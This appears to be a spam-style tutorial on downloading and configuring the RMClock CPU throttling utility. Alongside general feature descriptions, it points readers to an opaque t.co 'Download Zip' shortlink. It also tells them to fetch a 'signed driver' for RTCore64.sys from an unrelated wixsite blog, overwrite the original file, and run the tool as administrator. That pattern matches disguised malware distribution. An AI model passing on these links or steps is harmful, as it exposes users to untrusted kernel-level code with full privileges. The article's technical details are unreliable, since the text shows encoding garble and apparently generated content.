# How to Download and Use RMClock Utility for CPU Performance Optimization
  
RMClock Utility is a small GUI application that allows you to monitor and adjust the CPU frequency, throttling and load level of your processor in real-time. It supports various CPU models from AMD, Intel, VIA and Transmeta, and can dynamically change the CPU performance state (P-state) and clock modulation according to the CPU usage level and power management settings. In this article, we will show you how to download and use RMClock Utility for CPU performance optimization.
  
## Step 1: Download RMClock Utility
  
You can download RMClock Utility from the official website: [http://cpu.rightmark.org/products/rmclock.shtml](http://cpu.rightmark.org/products/rmclock.shtml). The basic version is free for personal non-commercial use and non-profit organizations. For commercial use, you need to contact the developers for licensing schemes.
 
**Download Zip Â» [https://t.co/zyJiJi7pEa](https://t.co/zyJiJi7pEa)**


  
After downloading the zip file, extract it to a folder of your choice. You will see two executable files: RMClock.exe and RMClockUpdater.exe. The first one is the main application, and the second one is the updater module that can check for updates and install them automatically.
  
## Step 2: Install RMClock Utility
  
To install RMClock Utility, you need to run RMClock.exe as administrator. If you are using a 64-bit Windows system, you also need to download and install a signed driver for RTCore64.sys, which is required for accessing the CPU registers. You can find the link for the signed driver here: [https://furaconpomapic.wixsite.com/hydnamyter/post/rt-core-64-driver-rmclock-download](https://furaconpomapic.wixsite.com/hydnamyter/post/rt-core-64-driver-rmclock-download). Download and extract the driver file to your RMClock folder and overwrite the old one.
  
After installing the driver, you can run RMClock.exe again as administrator. You will see a small icon in the system tray that shows the current CPU frequency and load level. You can right-click on the icon to access the main window of RMClock Utility.
  
## Step 3: Use RMClock Utility
  
The main window of RMClock Utility has four tabs: General, Advanced, Profiles and Settings. In the General tab, you can see the basic information about your CPU model, frequency, voltage, temperature, load level and power consumption. You can also adjust the CPU performance state (P-state) manually by dragging the sliders for FID (Frequency ID) and VID (Voltage ID). However, it is recommended to use the automatic management mode that can dynamically adjust the CPU performance state according to the CPU usage level and power management settings.
  
To enable the automatic management mode, you need to go to the Profiles tab and select a profile that suits your needs. There are four predefined profiles: Performance On Demand (default), Max Performance, Max Battery Life and Custom. You can also create your own profile by clicking on the New button and setting the parameters for each P-state. The parameters include FID, VID, minimum load level, maximum load level and transition latency. You can also set different profiles for AC power and battery power modes.

After selecting a profile, you need to click on Apply button to activate it. You will see a green check mark on the profile name indicating that it is active. You can also switch between profiles by right-clicking on the system tray icon and selecting a profile from the menu.
  
In the Advanced tab, you can fine-tune some advanced CPU-specific power management settings such as C1E (Enhanced Halt State), TM1/TM2 (Thermal Monitor 1/2), EIST (Enhanced Intel SpeedStep Technology), AMD Cool'n'Quiet Technology and more. These settings are only available for supported CPU models and may require BIOS support as well. You should be careful when changing these settings as they may affect the stability and performance of your system.
  
In the Settings tab, you can configure some general options such as startup behavior, logging options, update options, display options and more. You can also access some additional features such as battery information display, Windows power management settings and LCD display brightness control (where supported).
